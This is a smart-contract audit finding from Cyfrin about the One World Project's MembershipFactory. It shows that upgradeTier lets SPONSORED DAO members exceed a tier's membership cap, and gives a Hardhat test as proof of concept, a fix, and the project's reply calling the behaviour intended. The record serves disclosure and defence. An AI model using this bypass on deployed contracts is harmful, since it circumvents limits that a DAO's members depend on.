---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2024-10-29-cyfrin-one-world-project-v2-0-1-3
ingested_at: '2026-09-06T08:49:48Z'
protocol_category: []
published_at: '2024-10-29T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-10-29-cyfrin-one-world-project-v2.0.md
tags:
- firm:cyfrin
- report:2024-10-29-cyfrin-one-world-project-v2-0
title: Tier restrictions for `SPONSORED` DAOs can be bypassed by calling `MembershipFactory::upgradeTier`
vuln_class: []
---

# Tier restrictions for `SPONSORED` DAOs can be bypassed by calling `MembershipFactory::upgradeTier`

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2024-10-29-cyfrin-one-world-project-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-10-29-cyfrin-one-world-project-v2.0.md)_

---

**Description:** If the DAO specified by the `daoMembershipAddress` parameter in a call to `MembershipFactory::upgradeTier` is registered as [`SPONSORED`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L139), members can upgrade their tier by burning two lower tier tokens for one higher tier token. However, the [`tiers.minted`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L35) member of [`MembershipDAOStructs::DAOConfig`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L16) is not updated or validated against the configured [`tiers.amount`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L32), meaning that a DAO member can mint more higher tier tokens than intended by minting lower tier tokens and upgrading them.

**Impact:** The maximum number of memberships for a given tier can be circumvented by upgrading lower tier. Additionally, since `tiers.minted` is not decremented/incremented for the original and upgraded tiers respectively, no new tokens will be able to be minted for the lower tier.

**Proof of Concept:** The following test can be added to `describe("Upgrade Tier")` in `MembershipFactory.test.ts`:

```javascript
it("can upgrade above max amount and minted not updated", async function () {
  const lowTier = 5;
  const highTier = 4;
  await testERC20.mint(addr1.address, ethers.utils.parseEther("1000000"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("1000000"));
  for(let i = 0; i < 40; i++) {
    await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, highTier);
  }
  // cannot join anymore
  await expect(membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, highTier)).to.be.revertedWith("Tier full.");

  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, lowTier);
  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, lowTier);

  const tiersBefore = await membershipFactory.daoTiers(membershipERC1155.address);
  expect(tiersBefore[lowTier].minted).to.equal(2);
  expect(tiersBefore[highTier].minted).to.equal(40);

  // but can upgrade tier
  await membershipFactory.connect(addr1).upgradeTier(membershipERC1155.address, lowTier);

  // a total of 41 tokens for tier 4, max amount is 40
  const numberOfTokens = await membershipERC1155.balanceOf(addr1.address, highTier);
  expect(numberOfTokens).to.equal(41);

  // and minted hasn't changed
  const tiersAfter = await membershipFactory.daoTiers(membershipERC1155.address);
  expect(tiersAfter[lowTier].minted).to.equal(tiersBefore[lowTier].minted);
  expect(tiersAfter[highTier].minted).to.equal(tiersBefore[highTier].minted);
});
```

**Recommended Mitigation:** The `tiers.minted` member should be decremented for the original tier and incremented for the upgraded tier, validating that `tier.amount` is not exceeded.

**One World Project:** This is a business logic requirement. We have to allow upgradation even after the tier is full. So, the total minted will remain how many were minted, but the upgraded members will be above and beyond that

**Cyfrin:** Acknowledged.
